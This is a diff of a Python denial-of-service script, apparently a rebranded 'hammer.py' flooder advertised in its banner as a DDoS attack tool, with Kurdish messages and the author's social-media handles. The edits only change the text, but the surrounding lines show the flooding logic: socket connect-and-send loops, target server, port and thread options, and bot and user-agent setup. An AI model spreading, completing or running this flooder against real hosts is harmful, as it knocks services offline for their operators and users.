@@ -47,7 +47,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Kar dakat--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <••~daneret! Kar dakat~••> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -80,6 +80,7 @@ def usage():
   888      888      .oP"888    888     888    .oP"888  888        888888. 
   888     d88' .o. d8(  888    888 .   888 . d8(  888  888   .o8  888 `88b.
   o888bood8P'   Y8P `Y888""8o   "888"   "888" `Y888""8o `Y8bod8P' o888o o888o
+
   <===><===><===><===><===><===><===>°•°<===><===><===><===><===><===><===><===>
   *.          Toolek Bo (DDos)attack    bar prs nem la Hala bakar henan.      .*
   *.      Instagram:@t4llun   &&   @kam.aql  t.me/del4m  Snapchat:delon_m20.  .*
@@ -88,7 +89,7 @@ def usage():
   <===><===><===><===><===><===><===>°•°<===><===><===><===><===><===><===><===>
 def usage():
 	delon.attack Dos Script v.1
-	usage : python3 hammer.py [-s] [-p] [-t]
+	usage : python3 delon.attack [-s] [-p] [-t]
 	-h : yarmati
 	-s : up servar
 	-p : port 80
@@ -140,7 +141,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[94mkame chawareka...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
